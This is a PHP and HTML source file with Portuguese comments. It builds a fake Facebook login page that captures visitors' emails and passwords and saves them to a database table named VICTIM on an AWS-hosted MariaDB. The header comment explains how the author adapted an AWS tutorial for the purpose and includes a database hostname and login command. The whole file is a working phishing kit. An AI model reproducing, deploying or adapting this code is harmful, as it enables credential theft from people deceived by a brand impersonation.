


<!-- fonte css e formulario facebook: https://www.tutorialrepublic.com/snippets/preview.php?topic=bootstrap&file=facebook-theme-login-form botão direito / exibir codigo fonte do frame 

fonte php:
https://docs.aws.amazon.com/pt_br/AmazonRDS/latest/UserGuide/CHAP_Tutorials.WebServerDB.CreateWebServer.html

há cerca de dois anos atrás, em 2021, peguei esse código com o fernando mercês, em curso aws na alura. Provável que esse código ele pegou no site também. Então tive de relembrar as adaptações e dar uma melhorada mesmo no que fiz há dois anos.


Este código está dividido em 3 partes: 
-na tag style temos o css;
-dentro da tag body, na primeira div, temos o código de formulário do facebook;
-dentro da tag body, na segunda div, temos o código php que salva os dados na base de dados.

esse código foi focado em AWS, para uma ec2 em rede pública (este arquivo em /var/www/html e o arquivo de conexão com o banco em /var/www/cadastro), conectando em um rds com mariadb em rede privada. Mais informações em "documentacao apoio aws banco dados ec2 mariadb". Mas talvez funcione local também.

a base tarrafa criei acessando o rds através do ec2 (mysql -h dumbase2.c1ucsq6uqdba.us-west-1.rds.amazonaws.com -P 3306 -u admin -p) com o comando create databese tarrafa.

customizações que fiz no php da aws:
-coloquei o php na segunda tag div;
-substituí tudo (respeitando o que é maiúsculo do que é minúscolo, e nos comentários, nomes de variáveis, que começavam com letra maíscula, e plurais): name por email, address por password, employee(s) por victim;
-no php include, adaptei para "../connect/dbinfo.connect"
-no form template do facebook, nas tags input incluí os parâmetros name="EMAIL" e name="PASSWORD";
-removi o form que veio dentro, já que o form template do facebook (que está na primeira div) já provê isso;
-também removi os tr e o select que mostrava na página os dados cadastrados;
-talvez ainda há coisas que possam ser removidas desse código, já que o objetivo inicial dele é mostrar os dados em uma página, e eu estou usando-os apenas para salvar os dados na base.


-->

<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<title>Bootstrap Facebook Theme Login Form</title>
<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.0/css/bootstrap.min.css">
<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
<script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js"></script>
<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.0/js/bootstrap.min.js"></script>
<style>
body {
    color: #646464;
    background: #e2e2e2;
}	
.login-form {
    width: 300px;
    margin: 30px auto;
}
.login-form h2 {
    font-size: 26px;
    font-weight: bold;
    margin: 30px 0;
    text-align: center;
}
.login-form form {
    color: #fff;
    background: #405e9e;
    background: radial-gradient(circle, #4d6ba9, #375595);
    box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);
    padding: 25px;
    margin-bottom: 15px;
}
.login-form .form-control {
    border-color: #dfdfdf;
    box-shadow: none !important;
}
.login-form .form-control, .login-form .btn {
    min-height: 38px;        
}
.login-form input[type="email"] {
    border-radius: 2px 2px 0 0;
}
.login-form input[type="password"] {
    border-radius: 0 0 2px 2px;
    margin-top: -1px;
}    
.login-form .btn, .login-form .btn:active {        
    font-size: 15px;
    font-weight: bold;
    border-radius: 2px;
    background: #eeeeee !important;
    color: #646464;
    margin-bottom: 25px;
}
.login-form .btn:hover, .login-form .btn:focus{
    background: #e4e4e4 !important;
}
.login-form a {		
    color: #405e9e;
}
.login-form form a {
    color: #fff;
}
</style>
</head>
<body>
<div class="login-form">
    <form method="post">
		<h2 class="text-center">Facebook</h2>	
        <div class="form-group">
            <input type="email" class="form-control" placeholder="Email" name="EMAIL" required="required">
            <input type="password" class="form-control" placeholder="Password" name="PASSWORD" required="required">
        </div>
        <div class="form-group">
            <button type="submit" class="btn btn-secondary btn-block">Login</button>
        </div>
        <p class="text-center"><a href="#">Forgot Password?</a></p>     
    </form>
    <p class="text-center small">Not Registered? <a href="#">Create an Account</a></p>
</div>

<div>

<?php include "../connect/dbinfo.connect"; ?>

<?php

  /* Connect to MySQL and select the database. */
  $connection = mysqli_connect(DB_SERVER, DB_USERNAME, DB_PASSWORD);

  if (mysqli_connect_errno()) echo "Failed to connect to MySQL: " . mysqli_connect_error();

  $database = mysqli_select_db($connection, DB_DATABASE);

  /* Ensure that the VICTIM table exists. */
  VerifyVictimsTable($connection, DB_DATABASE);

  /* If input fields are populated, add a row to the VICTIM table. */
  $victim_email = htmlentities($_POST['EMAIL']);
  $victim_password = htmlentities($_POST['PASSWORD']);

  if (strlen($victim_email) || strlen($victim_password)) {
    AddVictim($connection, $victim_email, $victim_password);
  }
?>


<?php

/* Add an victim to the table. */
function AddVictim($connection, $email, $password) {
   $n = mysqli_real_escape_string($connection, $email);
   $a = mysqli_real_escape_string($connection, $password);

   $query = "INSERT INTO VICTIM (EMAIL, PASSWORD) VALUES ('$n', '$a');";

   if(!mysqli_query($connection, $query)) echo("<p>Error adding victim data.</p>");
}

/* Check whether the table exists and, if not, create it. */
function VerifyVictimsTable($connection, $dbName) {
  if(!TableExists("VICTIM", $connection, $dbName))
  {
     $query = "CREATE TABLE VICTIM (
         ID int(11) UNSIGNED AUTO_INCREMENT PRIMARY KEY,
         EMAIL VARCHAR(45),
         PASSWORD VARCHAR(90)
       )";

     if(!mysqli_query($connection, $query)) echo("<p>Error creating table.</p>");
  }
}

/* Check for the existence of a table. */
function TableExists($tableName, $connection, $dbName) {
  $t = mysqli_real_escape_string($connection, $tableName);
  $d = mysqli_real_escape_string($connection, $dbName);

  $checktable = mysqli_query($connection,
      "SELECT TABLE_NAME FROM information_schema.TABLES WHERE TABLE_NAME = '$t' AND TABLE_SCHEMA = '$d'");

  if(mysqli_num_rows($checktable) > 0) return true;

  return false;
}
?>                        



</div>

</body>
</html>


                
